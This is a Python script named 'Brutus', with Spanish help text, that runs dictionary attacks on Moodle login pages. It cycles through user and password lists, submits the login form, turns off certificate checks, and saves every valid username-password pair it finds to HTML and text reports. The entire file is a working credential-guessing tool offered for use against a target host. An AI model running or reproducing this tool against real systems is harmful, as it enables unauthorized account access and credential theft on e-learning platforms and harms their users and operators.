#!/usr/bin/python
# -*- coding: utf-8 -*-

#import httplib, urllib, 
import sys, os, ssl, html, time, mechanize

def help():
	print("\t\t\t\t\t\tBRUTUS")
	print("\n\nNOMBRE\n\tBrutus - Brute Force Tool (for Moodle)")
	print("\n\nDESCRIPCION\n\tBrutus es una herramienta que puede realizar ataques de diccionario.")
	print("\tPuede generar reportes con un resumen de la configuración del ataque.")
	print("\n\nPARAMETROS\n")
	print("\n\t -d (obligatorio) - Especifica el recurso a analizar en el host. Si no se especifica, por defecto se usa '/login/index.php'.")
	print("\n\t -p (obligatorio) - Especifica un diccionario de contraseñas. Si no es un archivo, se toma como la contraseña a probar.")
	print("\n\t -r (opcional)    - Genera un reporte en 'html' y otro en 'texto plano' con la configuracion del ataque.")
	print("\n\t -s (obligatorio) - Especifica una dirección IP o nombre de dominio del objetivo.")
	print("\n\t -u (obligatorio) - Especifica un diccionario de usuarios. Si no es un archivo, se toma como el usuario a probar.")
	print("\n\t -P (opcional)    - Especifica el puerto a usar. Si no se especifica, se usa el puerto 80 (HTTP) o 443 (HTTPS).")
	print("\n\t --sec (opcional) - Especifica que el protocolo a usar es HTTPS. Si no se especifica, se usa el protocolo HTTP.")
	print("\n\n\nEJEMPLOS DE USO\n")
	print("\n\t\t\thttp://aulavirtual.com/login/index.php\n\tbrutus.py -u usuarios.txt -p hola123., -s aulavirtual.com")
	print("\n\t\t\thttps://192.168.2.56/index.php\n\tbrutus.py -u usuarios.txt -p passwords.txt -s 192.168.2.56 d /index.php --sec")

def request(host, dir, port, usuarios, passwords, sec, rep):
	try:
		good = {}
		bad = 0 
		metodo = 'POST'
		protocolo = "https" if sec else "http"
		url  = ('%s://%s:%s%s' % (protocolo,host,port,dir))
	
		try:
			_create_unverified_https_context = ssl._create_unverified_context
		except AttributeError:
			# Legacy Python that doesn't verify HTTPS certificates by default
			pass
		else:
			# Handle target environment that doesn't support HTTPS verification
			ssl._create_default_https_context = _create_unverified_https_context
	
		br = mechanize.Browser()
		br.set_handle_robots(False)
		for u in usuarios:
			for p in passwords:
				response = br.open(url)
				br.addheaders = [("User-agent","Mozilla/5.0")]
				br.select_form(nr=1) #Selecciona la forma 'n'
				br.form['username'] = u #Le asigna a los inputs los usuarios y passwords
				br.form['password'] = p
				response = br.submit() #Hace el submit
				code = response.read()
				if code.find('loginerrors') >= 0 or code.find("loginerrormessage") >= 0:
					bad = bad +1
				else:
					good[u]=p
	except:
		print "Ocurrio un error durante la conexion\n"
	if rep:
		reporthtml(good,bad)
		reporttxt(good,bad)


def printError():
	print "./brutus.py -s [host] -u [usuario|diccionario] -p [contraseña|diccionario]\n"


def reporthtml(good, bad):
	try:
		f=open('resultado.html', 'w')
		now = time.strftime("%c")
		data = {}
		data['Fecha']=now
		data['Direccion']=host
		data['Puerto']=port
		data['Recurso']=dir
		data['https']=sec
		data['Usuario']=usr
		data['Pasword']=passw
		data ['Intentos']=bad+len(good)
		f.write("<!DOCTYPE html>\n")
		f.write("<HTML>\n")
		f.write("\t<HEAD><TITLE>Reporte Brutus</TITLE></HEAD>\n")
		f.write("\t<BODY>\n")	
		f.write("\t\t<H1>Reporte Autogenerado con Brutus</H1>\n")
		f.write("\t\t<p>En este reporte se detalla la actividad realizada con Brutus</p>\n")
		f.write("\t\t<p><b>DATOS GENERALES</b></p>\n")
		f.write("\t\t<TABLE>\n")
	
		for k, v in data.items():
		        f.write("\t\t\t<TR><TD WIDTH=100>%s</TD><TD WIDTH=300>%s</TD><TR>\n" % (k,v))
		
		f.write("\t\t</TABLE>\n")
		f.write("\t\t<p><b>CREDENCIALES VALIDAS ENCONTRADAS: %s </b></p>\n" % (len(good)))
		f.write("\t\t<TABLE><TR><TD><b>USUARIO</b></TD><TD><b>PASSWORD</b></TD></TR>\n")
		
		for k, v in sorted(good.items()):
		        f.write("\t\t\t<TR><TD WIDTH=100>%s</TD><TD WIDTH=100>%s</TD></TR>\n" % (k,v))
	
		f.write("\t\t</TABLE>\n")
		f.write("\t</BODY>\n</HTML>")
		f.close()
	except:
		print "Ocurrio un error al escribir el reporte HTML"

def reporttxt(good,bad):

	try:
		now = time.strftime("%c")
		data = {}
		data['Fecha']=now
		data['Direccion']=host
		data['Puerto']=port
		data['Recurso']=dir
		data['https']=sec
		data['Usuario']=usr
		data['Pasword']=passw
		data['Intentos']=bad+len(good)
		f=open('resultado.txt', 'w')
		now = time.strftime("%c")
		f.write("\t\t\tReporte Brutus (Autogenerado)\n")
		f.write("\t\tEn este reporte se detalla la actividad realizada con Brutus")
		f.write("\t\tDATOS GENERALES\n")
	
		for k, v in data.items():
			f.write("\t\t\t%s\t\t%s\n" % (k,v))
	
		f.write("\t\tCREDENCIALES VALIDAS ENCONTRADAS %s\n" % (len(good)))
		f.write("\t\tUSUARIO\t\tPASSWORD\n")
	
		for k, v in sorted(good.items()):
			f.write("\t\t%s\t\t%s\n" % (k,v))
	
		f.close()
	except:
		print "Ocurrio un error al escribir el reporte en texto plano"

#incio
if len(sys.argv) == 2 and sys.argv[1] == "-h":
	help()
elif len(sys.argv) < 7: #por lo menos debe tener 7 parametros
	print "PARAMETROS"
	printError()
elif not("-s" in sys.argv and "-u" in sys.argv and "-p" in sys.argv): #por lo menos debe incluir el usuario, contrasena, host y metodo de autenticacion
	print "OPCIONES"
	printError()
else:
	try:
		sec = False
		rep = False
		hostIndex = sys.argv.index("-s")+1 #Guarda el indice de donde se encuentra el sitio
		userIndex = sys.argv.index("-u")+1 #Indice del usuario
		passIndex = sys.argv.index("-p")+1 #Indice de la contrasena

	
		host = sys.argv[hostIndex] #Guarda los parametros que se le pasaron
		usr = sys.argv[userIndex]
		passw = sys.argv[passIndex]
	
		if "--sec" in sys.argv: #Usara el protocolo HTTPS
			sec = True
		if "-r" in sys.argv or "--report" in sys.argv: #Usara el protocolo HTTPS
                        rep = True
		if "-P" in sys.argv: #puerto (si lo incluye unicamente)
			portIndex = sys.argv.index("-P")+1
			port = sys.argv[portIndex]
		else:
			port = 443 if sec else 80 #Si no se especifica el puerto por defecto es el 80 (http) o 443 (https)
	
		if "-d" in sys.argv: #directorio
			dirIndex = sys.argv.index("-d")+1
			dir = sys.argv[dirIndex]
		else:
			dir = "/login/index.php" #Si no se especifica, el directorio (recurso) por defecto es el de moodle
	
		if os.path.isfile(usr): #Revisa si el parametro de usuarios es un archivo 
			with open(usr) as f: #Lo abre y recorre todos sus elementos
				usuarios = f.read().splitlines()
		else:
			usuarios = [usr] #Si no es un archivo, lo tomara como el usuario a usar
		if os.path.isfile(passw):#Lo mismo para las contrasenas
			with open(passw) as f:
				passwords = f.read().splitlines()
		else:
			passwords = [passw]
	except:
		printError()
	request(host, dir, port, usuarios, passwords, sec, rep)
